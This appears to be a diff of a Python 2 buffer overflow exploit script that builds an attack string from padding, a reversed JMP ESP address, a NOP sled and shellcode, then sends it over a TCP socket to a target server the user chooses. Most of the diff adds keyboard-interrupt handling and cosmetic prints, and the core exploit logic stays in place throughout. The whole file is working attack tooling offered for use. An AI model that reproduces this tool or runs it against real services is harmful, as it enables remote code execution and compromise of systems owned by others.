@@ -4,6 +4,7 @@ import socket
 import json
 import time
 import subprocess
+import readline
 
 
 class Buffer_Over:
@@ -17,15 +18,18 @@ class Buffer_Over:
          self.attack_all()
 	
      def string_ramdon(self):
-         self.Requst_String = str(raw_input("\n[+]Enter your reguset:"))
-         self.length_String =len(self.Requst_String)
-         time.sleep(2)
-         print "\n[+]character length is :",self.length_String
-         value = string.ascii_letters
-         self.Random_String = "".join(random.choice(value)for i in range(self.length_String))           
-         print "\n[+]Generated String is:",self.Random_String 
-         print '\n[+]The New character length is:',len(self.Random_String )
-
+         try:
+	 	 self.Requst_String = str(raw_input("\n[+]Enter your reguset:"))
+		 self.length_String =len(self.Requst_String)
+		 time.sleep(2)
+		 print "\n[+]character length is :",self.length_String
+		 value = string.ascii_letters
+		 self.Random_String = "".join(random.choice(value)for i in range(self.length_String))           
+		 print "\n[+]Generated String is:",self.Random_String 
+		 print '\n[+]The New character length is:',len(self.Random_String )
+         except KeyboardInterrupt:
+                  print "\n\n[+]-------------------------{GOOD BAY}--------------------------[+]"
+                  exit()
  
      def connect_servser(self):
           while True:
@@ -43,6 +47,9 @@ class Buffer_Over:
 		    break
 	        except Exception:
 		    print "\n[+]something goes wrong try again..!!**!! "
+                except KeyboardInterrupt:
+                  print "\n\n[+]-------------------------{GOOD BYE}--------------------------[+]"
+                  exit()
 
      def hexadecimal (self):                                                                           
           while True:
@@ -58,12 +65,13 @@ class Buffer_Over:
 	               break
                     else:
 	               print "\n[+]WE NOT FOUNF THE VALUE IN OUR STRING  "
-	               self.hexadecimal = str(raw_input("\n[+]Enter your hexadecimal value: "))
-                   
+	               self.hexadecimal = str(raw_input("\n[+]Enter your hexadecimal value: "))                  
                  except Exception:
 		       print "\n[+]something goes wrong try again..!!**!! "
-
-
+                 except KeyboardInterrupt:
+                     print "\n\n[+]-------------------------{GOOD BYE}--------------------------[+]"
+                     exit() 
+                
      def payload(self,payload, LHOST, LPORT):
 
          print "\nSelect Payload"
@@ -104,52 +112,58 @@ class Buffer_Over:
                    data = data.replace("\x00", "")
                    data = data.replace("\x0a", "")
                    data = data.replace("\x0d", "")
-                   data = data.replace("unsignedcharbuf[]=", "")
-                 
+                   data = data.replace("unsignedcharbuf[]=", "")               
                    data = data.rstrip()
                    self.payload_raw = data
                    print
 		   print self.payload_raw
-                   break
-		      
+                   break		      
                 except Exception:
-		   print "\n[+]something goes wrong try again..!!**!!" 
-
+		   print "\n[+]something goes wrong try again..!!**!!"                 
+                except KeyboardInterrupt:
+                   print "\n\n[+]-------------------------{GOOD BYE}--------------------------[+]"
+                   exit()
      def little_endian(self):
-         jump= raw_input("\n[+] Enter jump addrsss HEX  : ")
-         self.jump_address="".join(reversed([jump[i:i+2] for i in range(0, len(jump), 2)]))
-         self.jump_address= " ".join("\\x%s"%self.jump_address[i:i+2] for i in range(0, len(self.jump_address), 2))
-         self.jump_address=self.jump_address.replace(" ", "") 
-         print "\n[+]little endian Value is : ", self.jump_address
-     
+             try:
+                jump= raw_input("\n[+] Enter jump addrsss HEX  : ")
+                self.jump_address="".join(reversed([jump[i:i+2] for i in range(0, len(jump), 2)]))
+                self.jump_address= " ".join("\\x%s"%self.jump_address[i:i+2] for i in range(0, len(self.jump_address), 2))
+                self.jump_address=self.jump_address.replace(" ", "")
+                time.sleep(2) 
+                print "\n[+]little endian Value is : ", self.jump_address
+             except KeyboardInterrupt:
+                print "\n\n[+]-------------------------{GOOD BYE}--------------------------[+]"
+                exit()
      
 
      def attack_all(self):
           while True:
-	        try:
+	       try:
                    socket_2 =socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-                   Strat_string = self.location *"A"
-         
+                   Start_string = self.location*"A"        
                    NO_Operation =  len(self.Requst_String) - self.location 
-                   NO_Operation =  NO_Operation *"\\x90"
-          
-                   attack = Strat_string + self.jump_address + NO_Operation + self.payload_raw
-                   print '\n[+] attack =' ,len(Strat_string),'of "A" + JMP ESP ', self.jump_address ,'+',len(NO_Operation),'of "\\x90" +',self.payload
+                   NO_Operation =  NO_Operation*"\\x90"          
+                   attack = Start_string + self.jump_address + NO_Operation + self.payload_raw
+                   print '\n[+] attack =',len(Start_string),'of "A" + JMP ESP ', self.jump_address ,'+',len(NO_Operation),'of "\\x90" +',self.payload
+                   time.sleep(2)
                    print "\n[+]conncet server ip is  : ", self.server_ip
                    time.sleep(2)
-                   print "\n[+]conncet server port is  : ", self.server_port
-          
+                   print "\n[+]conncet server port is  : ", self.server_port         
                    socket_2.connect((self.server_ip,self.server_port))
                    data_recv  = socket_2.recv(1023)
                    socket_2.send(attack)
                    time.sleep(2)
 	           print "\n[+]data send successful...!!!"
                    socket_2.close()
-	           break
-	        except Exception:
-                   print "\n[+]something goes wrong try again..!!**!! "
-
-    
-
+                   print """              
+                                   %%%%%%%%%%%%%%%%%%%%%%%%(THANK YOU)%%%%%%%%%%%%%%%%%%%%"""                               
+	           break	
+               except Exception:
+		   print "\n[+]something goes wrong try again..!!**!!" 
+                   stop = str(raw_input("Enter any key yo connect :"))
+               except KeyboardInterrupt:
+                  print "\n\n[+]-------------------------{GOOD BYE}--------------------------[+]"
+                  exit()
 if __name__ == '__main__':
-     Buffer_Over()
+    Buffer_Over()
+
